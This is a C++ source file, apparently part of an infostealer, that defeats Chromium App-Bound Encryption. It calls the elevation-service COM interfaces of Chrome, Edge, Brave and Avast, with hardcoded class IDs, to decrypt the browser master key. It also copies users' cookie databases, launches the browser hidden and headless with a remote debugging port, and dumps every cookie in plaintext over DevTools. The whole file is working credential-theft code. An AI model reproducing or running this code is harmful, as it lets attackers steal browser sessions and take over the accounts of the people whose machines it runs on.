// Chromium App-Bound Encryption helpers - see abe.h for the overview.
#include "abe.h"
#include "sys.h"
#include "b64.h"
#include "json.h"
#include "crypto.h"
#include "log.h"
#include "obf.h"

#include <windows.h>
#include <objbase.h>
#include <winhttp.h>
#include <cstring>
#include <sstream>

namespace {

// ---------------- elevation service COM ----------------
// Vtable layout mirrors chrome/elevation_service/elevation_service_idl.idl:
//   IUnknown(3) + RunRecoveryCRXElevated + EncryptData + DecryptData.
struct IElevatorV1 : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR*, const WCHAR*,
                                                             const WCHAR*, const WCHAR*, DWORD,
                                                             ULONG_PTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(int protection_level, const BSTR plaintext,
                                                  BSTR* ciphertext, DWORD* last_error) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR ciphertext, BSTR* plaintext,
                                                  DWORD* last_error) = 0;
};

// Avast builds a 12-method vtable with DecryptData at byte offset 104 (slot 13).
struct IElevatorAvast : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE s4() = 0;
    virtual HRESULT STDMETHODCALLTYPE s5() = 0;
    virtual HRESULT STDMETHODCALLTYPE s6() = 0;
    virtual HRESULT STDMETHODCALLTYPE s7() = 0;
    virtual HRESULT STDMETHODCALLTYPE s8() = 0;
    virtual HRESULT STDMETHODCALLTYPE s9() = 0;
    virtual HRESULT STDMETHODCALLTYPE s10() = 0;
    virtual HRESULT STDMETHODCALLTYPE s11() = 0;
    virtual HRESULT STDMETHODCALLTYPE s12() = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR ciphertext, BSTR* plaintext,
                                                  DWORD* last_error) = 0; // slot 13
};

struct ElevatorTarget {
    const char* match; // lowercase substring of the browser name
    CLSID clsid;
    IID iid_v1;
    IID iid_v2;
    bool has_v2;
    bool avast;
};

const ElevatorTarget k_targets[] = {
    {"chrome beta",
     {0xDD2646BA, 0x3707, 0x4BF8, {0xB9, 0xA7, 0x03, 0x86, 0x91, 0xA6, 0x8F, 0xC2}},
     {0xA2721D66, 0x376E, 0x4D2F, {0x9F, 0x0F, 0x90, 0x70, 0xE9, 0xA4, 0x2B, 0x5F}},
     {0xB96A14B8, 0xD0B0, 0x44D8, {0xBA, 0x68, 0x23, 0x85, 0xB2, 0xA0, 0x32, 0x54}},
     true, false},
    {"brave",
     {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}},
     {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}},
     {0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}},
     true, false},
    {"edge",
     {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}},
     {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}},
     {0x8F7B6792, 0x784D, 0x4047, {0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05}},
     true, false},
    {"avast",
     {0xEAD34EE8, 0x8D08, 0x4CA1, {0xAD, 0xA3, 0x64, 0x75, 0x43, 0x74, 0xD8, 0x11}},
     {0x7737BB9F, 0xBAC1, 0x4C71, {0xA6, 0x96, 0x7C, 0x82, 0xD7, 0x99, 0x4B, 0x6F}},
     {},
     false, true},
    {"chrome",
     {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}},
     {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}},
     {0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}},
     true, false},
};

const ElevatorTarget* pick_target(const std::string& browser_name) {
    std::string lower = util::to_lower(browser_name);
    for (auto& t : k_targets)
        if (lower.find(t.match) != std::string::npos) return &t;
    return nullptr;
}

// one CoCreateInstance attempt against a specific interface id
std::vector<uint8_t> try_iid(const CLSID& clsid, const IID& iid, const BSTR input) {
    void* raw = nullptr;
    HRESULT hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER, iid, &raw);
    if (FAILED(hr) || !raw) return {};

    // same proxy blanket the Chromium clients and public PoCs use
    CoSetProxyBlanket((IUnknown*)raw, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
                      COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                      RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);

    BSTR plain = nullptr;
    DWORD last_error = 0;
    hr = ((IElevatorV1*)raw)->DecryptData(input, &plain, &last_error);
    ((IUnknown*)raw)->Release();
    if (FAILED(hr) || !plain) return {};

    UINT len = SysStringByteLen(plain);
    std::vector<uint8_t> out((uint8_t*)plain, (uint8_t*)plain + len);
    SysFreeString(plain);
    return out;
}

// ---------------- browser executable discovery ----------------
struct ExeCandidate { const char* match; const char* paths[5]; };

const ExeCandidate k_exe_paths[] = {
    {"chrome beta", {"%LOCALAPPDATA%\\Google\\Chrome Beta\\Application\\chrome.exe",
                     "%PROGRAMFILES%\\Google\\Chrome Beta\\Application\\chrome.exe", nullptr}},
    {"chrome dev", {"%LOCALAPPDATA%\\Google\\Chrome Dev\\Application\\chrome.exe", nullptr}},
    {"chrome canary", {"%LOCALAPPDATA%\\Google\\Chrome SxS\\Application\\chrome.exe", nullptr}},
    {"chrome",
     {"%LOCALAPPDATA%\\Google\\Chrome\\Application\\chrome.exe",
      "%PROGRAMFILES%\\Google\\Chrome\\Application\\chrome.exe",
      "%PROGRAMFILES(X86)%\\Google\\Chrome\\Application\\chrome.exe", nullptr}},
    {"edge",
     {"%PROGRAMFILES(X86)%\\Microsoft\\Edge\\Application\\msedge.exe",
      "%PROGRAMFILES%\\Microsoft\\Edge\\Application\\msedge.exe",
      "%LOCALAPPDATA%\\Microsoft\\Edge\\Application\\msedge.exe", nullptr}},
    {"brave",
     {"%PROGRAMFILES%\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
      "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", nullptr}},
    {"vivaldi", {"%LOCALAPPDATA%\\Vivaldi\\Application\\vivaldi.exe",
                 "%PROGRAMFILES%\\Vivaldi\\Application\\vivaldi.exe", nullptr}},
    {"opera", {"%LOCALAPPDATA%\\Programs\\Opera\\opera.exe",
               "%PROGRAMFILES%\\Opera\\opera.exe", nullptr}},
    {"yandex", {"%LOCALAPPDATA%\\Yandex\\YandexBrowser\\Application\\browser.exe", nullptr}},
    {"avast", {"%PROGRAMFILES%\\AVAST Software\\Browser\\AvastBrowser.exe",
               "%LOCALAPPDATA%\\AVAST Software\\Browser\\Application\\AvastBrowser.exe", nullptr}},
};

std::string short_rand() {
    auto rnd = crypto::random_bytes(6);
    static const char h[] = "0123456789abcdef";
    std::string s;
    for (uint8_t b : rnd) { s += h[b >> 4]; s += h[b & 0xF]; }
    return s;
}

// ---------------- minimal WebSocket-over-WinHTTP client ----------------
struct WsClient {
    HINTERNET session = nullptr, conn = nullptr, req = nullptr, ws = nullptr;
    ~WsClient() {
        if (ws) WinHttpWebSocketClose(ws, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, nullptr, 0);
        if (ws) WinHttpCloseHandle(ws);
        if (req) WinHttpCloseHandle(req);
        if (conn) WinHttpCloseHandle(conn);
        if (session) WinHttpCloseHandle(session);
    }

    bool connect(const std::string& host, int port, const std::string& ws_path) {
        session = WinHttpOpen(L"audit", WINHTTP_ACCESS_TYPE_NO_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!session) return false;
        WinHttpSetTimeouts(session, 4000, 4000, 8000, 20000);
        conn = WinHttpConnect(session, util::widen(host).c_str(), (INTERNET_PORT)port, 0);
        if (!conn) return false;
        req = WinHttpOpenRequest(conn, L"GET", util::widen(ws_path).c_str(), nullptr,
                                 WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        if (!req) return false;
        DWORD upgrade = WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET;
        WinHttpSetOption(req, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, &upgrade, sizeof(upgrade));
        if (!WinHttpSendRequest(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0, nullptr, 0, 0, 0))
            return false;
        if (!WinHttpReceiveResponse(req, nullptr)) return false;
        ws = WinHttpWebSocketCompleteUpgrade(req, 0);
        if (!ws) return false;
        WinHttpCloseHandle(req);
        req = nullptr;
        return true;
    }

    bool send_text(const std::string& text) {
        return WinHttpWebSocketSend(ws, WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
                                    (PVOID)text.data(), (DWORD)text.size()) == ERROR_SUCCESS;
    }

    // read one complete text message (fragments reassembled), bounded
    bool recv_text(std::string& out, size_t cap = 64 * 1024 * 1024) {
        out.clear();
        std::vector<char> buf(64 * 1024);
        for (;;) {
            DWORD read = 0;
            WINHTTP_WEB_SOCKET_BUFFER_TYPE type{};
            DWORD st = WinHttpWebSocketReceive(ws, buf.data(), (DWORD)buf.size(), &read, &type);
            if (st != ERROR_SUCCESS) return false;
            if (type == WINHTTP_WEB_SOCKET_UTF8_FRAGMENT_BUFFER_TYPE ||
                type == WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE) {
                out.append(buf.data(), read);
                if (out.size() > cap) return false;
                if (type == WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE) return true;
            } else if (type == WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE) {
                return !out.empty();
            } else {
                return false; // binary frame: unexpected here
            }
        }
    }
};

} // namespace

namespace abe {

std::vector<uint8_t> via_elevator(const std::vector<uint8_t>& appb_blob,
                                  const std::string& browser_name) {
    const ElevatorTarget* t = pick_target(browser_name);
    if (!t || appb_blob.empty()) return {};

    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    bool uninit = SUCCEEDED(hr);
    if (hr == RPC_E_CHANGED_MODE) uninit = false; // already MTA: proceed

    BSTR input = SysAllocStringByteLen((const char*)appb_blob.data(), (UINT)appb_blob.size());
    std::vector<uint8_t> out;
    if (input) {
        if (t->avast) {
            // Avast: slot-13 layout
            void* raw = nullptr;
            if (SUCCEEDED(CoCreateInstance(t->clsid, nullptr, CLSCTX_LOCAL_SERVER, t->iid_v1, &raw)) && raw) {
                CoSetProxyBlanket((IUnknown*)raw, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
                                  COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                                  RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                BSTR plain = nullptr;
                DWORD last_error = 0;
                if (SUCCEEDED(((IElevatorAvast*)raw)->DecryptData(input, &plain, &last_error)) && plain) {
                    UINT len = SysStringByteLen(plain);
                    out.assign((uint8_t*)plain, (uint8_t*)plain + len);
                    SysFreeString(plain);
                }
                ((IUnknown*)raw)->Release();
            }
        } else {
            if (out.empty() && t->has_v2) out = try_iid(t->clsid, t->iid_v2, input);
            if (out.empty()) out = try_iid(t->clsid, t->iid_v1, input);
        }
        SysFreeString(input);
    }
    if (uninit) CoUninitialize();

    if (out.size() == 32) return out;
    return {};
}

std::string find_browser_exe(const std::string& browser_name) {
    std::string lower = util::to_lower(browser_name);
    for (auto& c : k_exe_paths) {
        if (lower.find(c.match) == std::string::npos) continue;
        for (auto* p : c.paths) {
            if (!p) break;
            std::string full = util::expand_env(p);
            if (util::path_exists(full)) return full;
        }
    }
    return "";
}

std::string cookies_via_devtools(const std::string& browser_name,
                                 const std::string& browser_exe,
                                 const std::string& user_data_dir) {
    std::string exe = browser_exe;
    if (exe.empty()) exe = find_browser_exe(browser_name);
    if (exe.empty() || !util::is_dir(user_data_dir)) return "";

    // ---- private copy of the minimal profile ----
    std::string tmp = util::join(util::temp_dir(), "ud_" + short_rand());
    util::mkdirs(tmp);
    // Local State carries the ABE key; the browser unwraps it itself.
    util::copy_file_to(util::join(user_data_dir, "Local State"), util::join(tmp, "Local State"));
    std::vector<uint8_t> marker;
    util::write_file(util::join(tmp, "First Run"), marker);
    // profile dirs (Default, Profile N, plus the "single profile" layout)
    std::vector<std::string> profs;
    auto copy_cookies = [&](const std::string& rel_src, const std::string& rel_dst) {
        std::string net = util::join(user_data_dir, rel_src + "\\Network\\Cookies");
        if (util::path_exists(net)) {
            util::mkdirs(util::join(tmp, rel_dst + "\\Network"));
            util::copy_file_to(net, util::join(tmp, rel_dst + "\\Network\\Cookies"));
        }
        std::string legacy = util::join(user_data_dir, rel_src + "\\Cookies");
        if (util::path_exists(legacy)) {
            util::mkdirs(util::join(tmp, rel_dst));
            util::copy_file_to(legacy, util::join(tmp, rel_dst + "\\Cookies"));
        }
    };
    if (util::path_exists(util::join(user_data_dir, "Network\\Cookies")) ||
        util::path_exists(util::join(user_data_dir, "Cookies"))) {
        copy_cookies("", ""); // single-profile layout (Opera & friends)
    }
    for (auto& sub : util::list_subdirs(user_data_dir)) {
        std::string name = util::filename_of(sub);
        std::string lname = util::to_lower(name);
        if (lname == "default" || util::starts_with(lname, "profile") ||
            lname == "guest profile" || lname == "system profile") {
            profs.push_back(name);
        }
    }
    for (auto& p : profs) copy_cookies(p, p);

    // ---- launch headless with a DevTools port ----
    std::string cmd = "\"" + exe + "\" --headless --disable-gpu --no-first-run "
                      "--no-default-browser-check --disable-extensions --disable-sync "
                      "--remote-debugging-port=0 --remote-allow-origins=* "
                      "--user-data-dir=\"" + tmp + "\" about:blank";
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    std::vector<wchar_t> cmdline(cmd.begin(), cmd.end());
    cmdline.push_back(0);
    if (!CreateProcessW(nullptr, cmdline.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                        nullptr, nullptr, &si, &pi)) {
        util::remove_path(tmp);
        return "";
    }

    // wait for DevToolsActivePort (first line = port)
    std::string port_file = util::join(tmp, "DevToolsActivePort");
    int port = 0;
    for (int i = 0; i < 200; ++i) { // up to ~20 s
        std::vector<uint8_t> data;
        if (util::read_file(port_file, data) && data.size() > 2) {
            std::string s(data.begin(), data.end());
            auto nl = s.find('\n');
            try { port = std::stoi(s.substr(0, nl)); } catch (...) { port = 0; }
            if (port > 0) break;
        }
        Sleep(100);
    }
    if (port <= 0) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        util::remove_path(tmp);
        return "";
    }

    // ---- ask the browser for its cookies ----
    std::string out_lines;
    {
        // HTTP GET /json/version -> webSocketDebuggerUrl
        std::string ws_url;
        {
            HINTERNET ses = WinHttpOpen(L"audit", WINHTTP_ACCESS_TYPE_NO_PROXY,
                                        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
            if (ses) {
                WinHttpSetTimeouts(ses, 4000, 4000, 8000, 12000);
                HINTERNET co = WinHttpConnect(ses, L"127.0.0.1", (INTERNET_PORT)port, 0);
                if (co) {
                    HINTERNET rq = WinHttpOpenRequest(co, L"GET", L"/json/version", nullptr,
                                                      WINHTTP_NO_REFERER,
                                                      WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
                    if (rq && WinHttpSendRequest(rq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, nullptr, 0, 0, 0) &&
                        WinHttpReceiveResponse(rq, nullptr)) {
                        std::string body;
                        DWORD avail = 0;
                        while (WinHttpQueryDataAvailable(rq, &avail) && avail > 0) {
                            std::vector<char> buf(avail);
                            DWORD rd = 0;
                            if (!WinHttpReadData(rq, buf.data(), avail, &rd) || rd == 0) break;
                            body.append(buf.data(), rd);
                        }
                        try {
                            auto j = util::json::parse(body);
                            if (j.contains("webSocketDebuggerUrl"))
                                ws_url = j["webSocketDebuggerUrl"].get<std::string>();
                        } catch (...) {}
                    }
                    if (rq) WinHttpCloseHandle(rq);
                    WinHttpCloseHandle(co);
                }
                WinHttpCloseHandle(ses);
            }
        }
        // parse ws://host:port/path
        if (ws_url.rfind("ws://", 0) == 0) {
            std::string rest = ws_url.substr(5);
            auto slash = rest.find('/');
            std::string authority = rest.substr(0, slash);
            std::string path = slash == std::string::npos ? "/" : rest.substr(slash);
            auto colon = authority.rfind(':');
            int ws_port = port;
            if (colon != std::string::npos) {
                try { ws_port = std::stoi(authority.substr(colon + 1)); } catch (...) {}
            }
            WsClient ws_client;
            if (ws_client.connect("127.0.0.1", ws_port, path)) {
                if (ws_client.send_text("{\"id\":1,\"method\":\"Network.getAllCookies\"}")) {
                    for (int m = 0; m < 40; ++m) {
                        std::string msg;
                        if (!ws_client.recv_text(msg)) break;
                        try {
                            auto j = util::json::parse(msg);
                            if (!j.contains("id") || j["id"].get<int>() != 1) continue;
                            if (!j.contains("result")) break;
                            auto& cookies = j["result"]["cookies"];
                            std::ostringstream out;
                            for (auto& c : cookies) {
                                std::string host = c.value("domain", "");
                                std::string name = c.value("name", "");
                                std::string value = c.value("value", "");
                                std::string cpath = c.value("path", "/");
                                out << host << "\t" << name << "\t" << value << "\t" << cpath << "\r\n";
                            }
                            out_lines = out.str();
                            break;
                        } catch (...) { continue; }
                    }
                }
            }
        }
    }

    // ---- cleanup ----
    TerminateProcess(pi.hProcess, 0);
    WaitForSingleObject(pi.hProcess, 3000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    util::remove_path(tmp);

    if (!out_lines.empty())
        ULOG("[abe] devtools: decrypted cookies for " + browser_name + " (" +
             std::to_string(out_lines.size() / 80) + "+ lines)");
    return out_lines;
}

} // namespace abe
